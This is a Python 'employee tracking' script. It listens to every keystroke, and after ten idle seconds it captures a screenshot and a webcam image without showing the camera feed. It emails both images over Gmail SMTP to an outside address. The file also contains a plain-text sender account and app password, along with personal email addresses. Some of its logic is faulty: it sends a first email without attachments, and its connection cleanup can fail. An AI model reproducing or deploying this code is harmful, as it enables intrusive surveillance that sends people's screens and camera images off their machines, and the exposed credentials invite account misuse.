import email
from email.mime.base import MIMEBase
from pynput import keyboard
from plyer import notification
import threading
import time
import cv2
import numpy as np
from PIL import ImageGrab
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

idle_time = 0

def show_toast(title, message, duration=5):
    notification.notify(
        title=title,
        message=message,
        timeout=duration,
    )

def on_press(key):
    global idle_time
    idle_time = 0  # Reset the idle time when a key is pressed
    try:
        # Print the key that was pressed
        print(f'Key {key.char} pressed')
    except AttributeError:
        # If a special key (like Shift or Enter) was pressed
        print(f'Special Key {key} pressed')

def check_idle():
    global idle_time
    while True:
        if idle_time >= 10:
            print("Idle")
            title = "Employee Tracking"
            message = "Focus on your work please, you are being recorded."
            show_toast(title, message)
            idle_time = 0
            take_screenshot_and_camera()
            send_email_with_screenshot()
        else:
            time.sleep(1)
            idle_time += 1

def take_screenshot_and_camera():
    # Capture screenshot
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.png')  # Save the screenshot as 'screenshot.png'

    # Capture camera image without showing the camera feed
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('camera_image.png', frame)  # Save the camera image as 'camera_image.png'
    cap.release()

def send_email(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password):
    # Create a MIMEText object to represent the email content
    email_body = MIMEMultipart()
    email_body.attach(MIMEText(message, 'plain'))

    # Create the email headers
    email_body['Subject'] = subject
    email_body['From'] = from_email
    email_body['To'] = to_email

    try:
        # Connect to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Start TLS encryption (if supported by the server)
        server.login(smtp_username, smtp_password)  # Log in to the server

        # Send the email
        server.sendmail(from_email, to_email, email_body.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print("Failed to send email. Error:", str(e))
    finally:
        # Close the connection to the SMTP server
        server.quit()

def send_email_with_screenshot():
    subject = "Suspicious Activity Detected"
    message = "Please check the attached screenshot and camera image for details."
    from_email = "abilalcybex@gmail.com"  # Your email address
    to_email = "i.l3br3l@gmail.com"  # Recipient's email address
    smtp_server = "smtp.gmail.com"
    smtp_port = 587  # For Gmail
    smtp_username = "abilalcybex@gmail.com"  # Your email username
    smtp_password = "fgfk iejq xkpa dsvw"  # Use app-specific password

    # Send the email with screenshot and camera image as attachments
    send_email(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password)
    attach_files_to_email()

def attach_files_to_email():
    subject = "Suspicious Activity Detected"
    from_email = "abilalcybex@gmail.com"  # Your email address
    to_email = "i.l3br3l@gmail.com"  # Recipient's email address
    smtp_server = "smtp.gmail.com"
    smtp_port = 587  # For Gmail
    smtp_username = "abilalcybex@gmail.com"  # Your email username
    smtp_password = "fgfk iejq xkpa dsvw"  # Use app-specific password

    # Create a MIMEText object to represent the email content
    email_body = MIMEMultipart()
    email_body.attach(MIMEText("Please check the attached screenshot and camera image for details.", 'plain'))

    # Create the email headers
    email_body['Subject'] = subject
    email_body['From'] = from_email
    email_body['To'] = to_email

    # Attach the screenshot and camera image to the email
    for filename in ['screenshot.png', 'camera_image.png']:
        with open(filename, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            email.encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {filename}")
        email_body.attach(part)

    try:
        # Connect to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Start TLS encryption (if supported by the server)
        server.login(smtp_username, smtp_password)  # Log in to the server

        # Send the email
        server.sendmail(from_email, to_email, email_body.as_string())
        print("Email with screenshot and camera image sent successfully!")
    except Exception as e:
        print("Failed to send email with screenshot and camera image. Error:", str(e))
    finally:
        # Close the connection to the SMTP server
        server.quit()

# Create a listener
listener = keyboard.Listener(on_press=on_press)

# Start the listener
listener.start()

# Start the idle check in a separate thread
idle_thread = threading.Thread(target=check_idle)
idle_thread.daemon = True
idle_thread.start()

# Keep the listener running until a key is pressed
listener.join()
